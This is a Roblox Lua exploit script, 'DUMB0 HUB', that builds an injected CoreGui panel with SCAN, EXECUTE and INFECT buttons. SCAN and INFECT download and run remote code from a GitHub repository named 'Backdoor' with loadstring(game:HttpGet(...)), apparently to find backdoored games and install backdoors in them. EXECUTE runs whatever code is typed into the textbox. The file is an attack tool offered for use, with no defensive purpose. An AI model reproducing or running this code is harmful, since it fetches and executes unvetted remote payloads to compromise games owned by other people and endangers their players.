-- [[ DUMB0 HUB - REBRANDED & FIXED ]] --
local G2L = {}
local username = "its-Dumb0xd"
local repo = "Backdoor" -- FIXED: Matches your new repo name

-- Instances:
G2L["1"] = Instance.new("ScreenGui", game:GetService('CoreGui'):WaitForChild('RobloxGui'))
G2L["1"]["Name"] = [[Dumb0HubBackdoor]]
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling
G2L["1"]["ResetOnSpawn"] = false

-- Main Frame
G2L["2"] = Instance.new("Frame", G2L["1"])
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(15, 15, 15)
G2L["2"]["Size"] = UDim2.new(0, 482, 0, 276)
G2L["2"]["Position"] = UDim2.new(0.3, 0, 0.3, 0)
G2L["2"]["Active"] = true
G2L["2"]["Draggable"] = true 

Instance.new("UICorner", G2L["2"])

-- Title Label
G2L["1d"] = Instance.new("TextLabel", G2L["2"])
G2L["1d"]["Text"] = [[DUMB0 HUB]]
G2L["1d"]["Size"] = UDim2.new(1, 0, 0, 50)
G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
G2L["1d"]["BackgroundTransparency"] = 1
G2L["1d"]["TextSize"] = 35
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold)

-- Executor Box
G2L["f"] = Instance.new("Frame", G2L["2"])
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(22, 22, 22)
G2L["f"]["Size"] = UDim2.new(0, 450, 0, 120)
G2L["f"]["Position"] = UDim2.new(0.03, 0, 0.25, 0)
Instance.new("UICorner", G2L["f"])

G2L["11"] = Instance.new("TextBox", G2L["f"])
G2L["11"]["Size"] = UDim2.new(1, -10, 1, -10)
G2L["11"]["Position"] = UDim2.new(0, 5, 0, 5)
G2L["11"]["BackgroundTransparency"] = 1
G2L["11"]["TextColor3"] = Color3.fromRGB(200, 200, 200)
G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left
G2L["11"]["TextYAlignment"] = Enum.TextYAlignment.Top
G2L["11"]["MultiLine"] = true
G2L["11"]["Text"] = ""
G2L["11"]["PlaceholderText"] = "-- Code goes here"

-- Button Helper
local function CreateButton(pos, color, text)
    local btnFrame = Instance.new("Frame", G2L["2"])
    btnFrame.Size = UDim2.new(0, 140, 0, 35)
    btnFrame.Position = pos
    btnFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Instance.new("UICorner", btnFrame)
    local btn = Instance.new("TextButton", btnFrame)
    btn.Size = UDim2.new(1, 0, 1, 0)
    btn.BackgroundTransparency = 1
    btn.Text = text
    btn.TextColor3 = color
    btn.TextSize = 18
    btn.FontFace = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold)
    return btn
end

local ScanBtn = CreateButton(UDim2.new(0.03, 0, 0.8, 0), Color3.fromRGB(255, 255, 0), "SCAN")
local ExecBtn = CreateButton(UDim2.new(0.35, 0, 0.8, 0), Color3.fromRGB(0, 255, 0), "EXECUTE")
local InfectBtn = CreateButton(UDim2.new(0.67, 0, 0.8, 0), Color3.fromRGB(255, 0, 255), "INFECT")

-- LOGIC
ScanBtn.MouseButton1Click:Connect(function()
    local url = "https://raw.githubusercontent.com/"..username.."/"..repo.."/main/Backdoor-Scanner/script.lua"
    loadstring(game:HttpGet(url))().Scan()
end)

ExecBtn.MouseButton1Click:Connect(function()
    loadstring(G2L["11"].Text)()
end)

InfectBtn.MouseButton1Click:Connect(function()
    local url = "https://raw.githubusercontent.com/"..username.."/"..repo.."/main/Backdoor-Infecter/installer.lua"
    loadstring(game:HttpGet(url))()
end)
